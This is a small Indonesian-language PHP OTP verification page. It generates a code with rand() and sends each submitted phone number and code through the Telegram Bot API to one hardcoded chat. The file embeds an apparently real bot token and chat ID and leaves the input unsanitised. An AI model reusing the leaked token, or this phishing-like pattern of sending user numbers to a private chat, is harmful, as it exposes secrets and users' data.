<?php
session_start();

// Token & chat ID bot Telegram
$token   = "8431532215:AAFC-dFTIyhsxqpjoGag9Aos2BjBZh-ZzUk";
$chatId  = "7600109796";

// Kalau nomor dikirim dari login
if (isset($_POST['phone'])) {
    $phone = $_POST['phone'];

    // Buat OTP random
    $otp = rand(100000, 999999);

    // Simpan di session
    $_SESSION['otp'] = $otp;
    $_SESSION['phone'] = $phone;

    // Kirim OTP via Telegram
    $text = "Kode OTP untuk nomor $phone adalah: $otp";
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=" . urlencode($text);
    file_get_contents($url);
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Verifikasi OTP</title>
  <style>
    body { font-family: Arial, sans-serif; background: #e8f0fe; display:flex; justify-content:center; align-items:center; height:100vh; }
    .container { background:#fff; padding:20px; border-radius:10px; width:300px; box-shadow:0 0 10px rgba(0,0,0,0.2); }
    h2 { text-align:center; }
    input, button { width:100%; padding:10px; margin:8px 0; border-radius:5px; border:1px solid #ccc; }
    button { background:#007bff; color:#fff; cursor:pointer; }
    button:hover { background:#0056b3; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Verifikasi OTP</h2>
    <form action="welcome.php" method="post">
      <label>Masukkan OTP</label>
      <input type="text" name="otp_input" required>
      <button type="submit">Verifikasi</button>
    </form>
  </div>
</body>
</html>
